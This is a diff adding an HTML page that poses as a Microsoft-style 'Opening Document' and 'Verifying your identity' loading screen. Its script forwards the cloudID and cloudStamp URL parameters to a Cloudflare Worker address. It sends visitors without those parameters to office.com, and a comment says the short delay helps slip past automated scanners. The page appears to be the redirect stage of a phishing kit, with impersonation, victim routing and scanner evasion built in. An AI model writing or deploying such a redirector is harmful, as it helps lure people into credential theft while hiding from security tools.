@@ -1,1 +1,91 @@
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Opening Document...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f2f2f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .container {
+            text-align: center;
+            background: white;
+            padding: 40px;
+            border-radius: 4px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 90%;
+        }
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0067b8;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        h2 {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 10px;
+            font-weight: 400;
+        }
+        p {
+            font-size: 14px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="spinner"></div>
+        <h2>Verifying your identity</h2>
+        <p>Please wait while we securely redirect you...</p>
+    </div>
+
+    <script>
+        // CONFIGURATION: Replace this with your actual Cloudflare Worker URL
+        const WORKER_URL = "https://lingering-sun-70bf.jacobolson99.workers.dev/";
+
+        function redirect() {
+            // 1. Grab the current URL parameters
+            const urlParams = new URLSearchParams(window.location.search);
+            const cloudID = urlParams.get('cloudID');
+            const cloudStamp = urlParams.get('cloudStamp');
+
+            // 2. Construct the destination URL
+            // We pass the parameters exactly as they are to the worker
+            if (cloudID && cloudStamp) {
+                const destination = `${WORKER_URL}?cloudID=${encodeURIComponent(cloudID)}&cloudStamp=${encodeURIComponent(cloudStamp)}`;
+                
+                // 3. Perform the redirect
+                // Using location.replace ensures the redirector page isn't in the back-button history
+                window.location.replace(destination);
+            } else {
+                // If parameters are missing, redirect to a safe page or show error
+                window.location.replace("https://www.office.com");
+            }
+        }
+
+        // Execute redirect after a tiny delay to ensure the "Loading" UI is seen briefly
+        // This helps bypass some automated scanners that don't wait for JS execution
+        setTimeout(redirect, 800);
+    </script>
+</body>
+</html>
